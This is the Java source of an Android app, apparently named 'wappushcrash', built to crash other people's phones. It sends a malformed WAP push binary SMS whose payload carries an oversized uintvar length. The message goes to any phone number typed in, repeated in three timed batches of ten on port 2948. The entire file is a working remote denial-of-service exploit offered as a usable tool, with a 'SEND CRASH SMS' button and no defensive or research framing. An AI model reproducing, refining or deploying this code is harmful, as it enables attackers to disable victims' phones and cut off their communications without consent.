package com.markb.wappushcrash;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.InputType;
import android.view.ViewGroup.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {

    private static final byte[] CRASH_PDU = {
         0x01, 0x06,                          // transaction id, PDU type
         (byte)0x88, (byte)0x80, (byte)0x80,  // uintvar continuation bytes
         (byte)0x80, (byte)0xFF,              // final uintvar byte -> value >= 0x80000000
         (byte)0xBE                           // trailing data
    };

    private EditText phoneInput;
    private TextView status;

    private final BroadcastReceiver sentReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context c, Intent i) {
            int rc = getResultCode();
            String msg = (rc == Activity.RESULT_OK)
                    ? "SENT OK (handed to modem)"
                    : "FAILED rc=" + rc;
            status.append("\n" + msg);
        }
    };
    private final BroadcastReceiver deliveredReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context c, Intent i) {
        int rc = getResultCode();
        String msg = (rc == Activity.RESULT_OK)
                ? "DELIVERED to target"
                : "DELIVERY FAILED rc=" + rc;
        status.append("\n" + msg);
    }
};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().getDecorView().setBackgroundColor(0xFFB0B0B0);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFFB0B0B0);
        root.setPadding(48, 480, 48, 48);

        TextView destLabel = new TextView(this);
        destLabel.setText("Target phone number:");
        root.addView(destLabel);

        phoneInput = new EditText(this);
        phoneInput.setHint("e.g. 0771234567");
        phoneInput.setInputType(InputType.TYPE_CLASS_PHONE);
        root.addView(phoneInput);

        Button sendBtn = new Button(this);
        sendBtn.setText("SEND CRASH SMS");
        sendBtn.setPadding(0, 32, 0, 32);
        sendBtn.setOnClickListener(v -> sendCrashSms());
        root.addView(sendBtn);

        status = new TextView(this);
        status.setPadding(0, 24, 0, 0);
        status.setTextSize(14);
        root.addView(status);

        ScrollView scroll = new ScrollView(this);
        scroll.addView(root, new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT));
        setContentView(scroll);

        requestPermissions(new String[] { Manifest.permission.SEND_SMS }, 1);

        registerReceiver(sentReceiver, new IntentFilter("com.markb.SMS_SENT"), Context.RECEIVER_NOT_EXPORTED);
        registerReceiver(deliveredReceiver, new IntentFilter("com.markb.SMS_DELIVERED"), Context.RECEIVER_NOT_EXPORTED);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try { unregisterReceiver(sentReceiver); } catch (Exception ignored) {}
        try { unregisterReceiver(deliveredReceiver); } catch (Exception ignored) {}
    }

    private void sendCrashSms() {
        String dest = phoneInput.getText().toString().trim();
        if (dest.isEmpty()) {
            status.setText("Enter target phone number first.");
            return;
        }
        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            status.setText("SEND_SMS permission not granted.");
            return;
        }

        try {
            SmsManager mgr = getSystemService(SmsManager.class);
            if (mgr == null) mgr = SmsManager.getDefault();
            PendingIntent deliveredPI = PendingIntent.getBroadcast(
                    this, 1,                                    // request code 1 (distinct from sentPI's 0)
                    new Intent("com.markb.SMS_DELIVERED"),      // separate action for delivery
                    PendingIntent.FLAG_IMMUTABLE);              // required on modern Android

          new Thread(() -> {
            for (int batch = 0; batch < 3; batch++) {
                for (int i = 0; i < 10; i++) {
                    PendingIntent sentPI = PendingIntent.getBroadcast(
                    this, batch * 10 + i,
                    new Intent("com.markb.SMS_SENT"),
                    PendingIntent.FLAG_IMMUTABLE);

                    PendingIntent deliveredPI = PendingIntent.getBroadcast(
                    this, 100 + batch * 10 + i,
                    new Intent("com.markb.SMS_DELIVERED"),
                    PendingIntent.FLAG_IMMUTABLE);
                    mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, sentPI, deliveredPI);
                    try { Thread.sleep(500); }
                    catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
        }
                if (batch < 2) {
                    try { Thread.sleep(60_000); }
                    catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
        }
    }
    runOnUiThread(() -> status.append("\nloop done"));
}).start();          // start the thread
            
            String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
            status.setText("[" + ts + "] Attempting send to: " + dest + "\n");
            
        } catch (SecurityException e) {
            status.setText("SecurityException: " + e.getMessage());
        } catch (Exception e) {
            status.setText("Send error: " + e.getMessage());
        }
    }
}
